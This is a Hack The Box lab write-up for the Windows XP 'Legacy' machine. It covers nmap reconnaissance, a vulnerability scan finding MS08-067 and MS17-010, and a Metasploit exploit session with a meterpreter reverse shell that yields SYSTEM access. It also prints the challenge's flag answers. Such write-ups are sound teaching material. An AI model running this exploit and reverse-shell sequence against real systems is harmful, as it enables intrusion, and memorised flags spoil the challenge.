---
title: 'Legacy'
date: '2026-09-07'
excerpt: 'Easy - Windows'
prog: 'Hack The Box Machines - September 2026'
type: 'machines'
---

<div class="writeup-header">
<div class="writeup-header-text">
<div class="writeup-org">Hack The Box</div>
<h1 class="writeup-title">Legacy</h1>
<div class="writeup-date">September 2026 &middot; Machines</div>
</div>
</div>
<p class="lead mb-4">Legacy is a fairly straightforward beginner-level machine which demonstrates the potential security risks of SMB on Windows. Only one publicly available exploit is required to obtain administrator access.</p>

<h4 class="mb-3">Tasks</h4>
<p class="mb-2"><strong>Question 1:</strong> How many TCP ports are open on Legacy?</p>
<p class="mb-3">Run <code>nmap -sC -sV -A [TARGET_IP] -Pn</code>.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-qbplabfgur]─[~]
└──╼ [★]$ nmap -sC -sV -A 10.129.227.181 -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-06 20:20 EDT
Nmap scan report for 10.129.227.181
Host is up (0.27s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:95:5e:2f (VMware)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2026-09-12T05:25:02+03:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: 5d00h34m00s, deviation: 2h07m16s, median: 4d23h04m00s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.76 seconds
```

<p class="mb-5"><strong>Answer:</strong> 3</p>
<br />


<p class="mb-2"><strong>Question 2:</strong> What is the 2008 CVE ID for a vulnerability in SMB that allows for remote code execution?</p>
<p class="mb-3">We can use <code>nmap --script=smb-vuln* [TARGET_IP]</code> to scan for vulnerabilities.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-qbplabfgur]─[~]
└──╼ [★]$ nmap --script=smb-vuln* 10.129.227.181
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-06 20:23 EDT
Nmap scan report for 10.129.227.181
Host is up (0.27s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-054: false
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)

Nmap done: 1 IP address (1 host up) scanned in 33.70 seconds
```

<p class="mb-5"><strong>Answer:</strong> CVE-2008-4250</p>
<br />


<p class="mb-2"><strong>Question 3:</strong> What is the name of the Metasploit module that exploits CVE-2008-4250?</p>
<p class="mb-3">In Metasploit, run <code>search CVE-2008-4250</code>.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-qbplabfgur]─[~]
└──╼ [★]$ msfconsole -q
[msf](Jobs:0 Agents:0) >> search CVE-2008-4250

Matching Modules
================

   #   Name                                                             Disclosure Date  Rank   Check  Description
   -   ----                                                             ---------------  ----   -----  -----------
   0   exploit/windows/smb/ms08_067_netapi                              2008-10-28       great  Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption
   1     \_ target: Automatic Targeting                                 .                .      .      .
   2     \_ target: Windows 2000 Universal                              .                .      .      .
   3     \_ target: Windows XP SP0/SP1 Universal                        .                .      .      .
   [...]
   80    \_ target: Windows 2003 SP2 Russian (NX)                       .                .      .      .
   81    \_ target: Windows 2003 SP2 Swedish (NX)                       .                .      .      .
   82    \_ target: Windows 2003 SP2 Turkish (NX)                       .                .      .      .


Interact with a module by name or index. For example info 82, use 82 or use exploit/windows/smb/ms08_067_netapi
After interacting with a module you can manually set a TARGET with set TARGET 'Windows 2003 SP2 Turkish (NX)'

[msf](Jobs:0 Agents:0) >> 
```

<p class="mb-5"><strong>Answer:</strong> ms08_067_netapi</p>
<br />


<p class="mb-2"><strong>Question 4:</strong> When exploiting MS08-067, what user does execution run as? Include the information before and after the .</p>
<p class="mb-3"></p>

```console
[msf](Jobs:0 Agents:0) >> use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms08_067_netapi) >> show options

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    445              yes       The SMB service port (TCP)
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     94.237.67.52     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting



View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) exploit(windows/smb/ms08_067_netapi) >> set RHOSTS 10.129.227.181
RHOSTS => 10.129.227.181
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms08_067_netapi) >> set LHOST 10.10.14.224
LHOST => 10.10.14.224
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms08_067_netapi) >> exploit
[*] Started reverse TCP handler on 10.10.14.224:4444 
[*] 10.129.227.181:445 - Automatically detecting the target...
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.25/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
[*] 10.129.227.181:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.129.227.181:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.129.227.181:445 - Attempting to trigger the vulnerability...
[*] Sending stage (190534 bytes) to 10.129.227.181
[*] Meterpreter session 1 opened (10.10.14.224:4444 -> 10.129.227.181:1041) at 2026-09-06 20:29:52 -0400

(Meterpreter 1)(C:\WINDOWS\system32) > getuid
Server username: NT AUTHORITY\SYSTEM
(Meterpreter 1)(C:\WINDOWS\system32) > shell
Process 2040 created.
Channel 1 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>
```

<p class="mb-5"><strong>Answer:</strong> NT AUTHORITY\SYSTEM</p>
<br />


<p class="mb-2"><strong>Question 5:</strong> Submit the flag located on the john user's desktop.</p>
<p class="mb-3">Navigate to <code>C:\Documents and Settings\john\Desktop</code> and read <code>user.txt</code>.</p>
<p class="mb-5"><strong>Answer:</strong> e69af0e4f443de7e36876fda4ec7644f</p>
<br />


<p class="mb-2"><strong>Question 6:</strong> Submit the flag located on the administrator's desktop.</p>
<p class="mb-3">Navigate to <code>C:\Documents and Settings\Administrator\Desktop</code> and read <code>root.txt</code>.</p>
<p class="mb-5"><strong>Answer:</strong> 993442d258b0e0ec917cae9e695d5713</p>
<br />


<p class="mb-2"><strong>Question 7:</strong> In addition to MS08-067, Legacy's SMB service is also vulnerable to another remote code execution vulnerability with a CVE ID from 2017. What is that ID?</p>
<p class="mb-3">Refer to the second nmap script we perform particularly to scan for vulnerabilities.</p>
<p class="mb-5"><strong>Answer:</strong> CVE-2017-0143</p>


<hr />
<section class="text-center" style="margin-top:1.5rem; margin-bottom:1.5rem;">
<p class="mb-1" style="font-style:italic; font-size:1.125rem;">See you in the next Hacking Lab.</p>
<p class="mb-0" style="font-weight:700;">@aaronamran</p>
<p class="text-muted small mt-1">September 2026</p>
</section>

<div class="writeup-nav">
</div>
</div>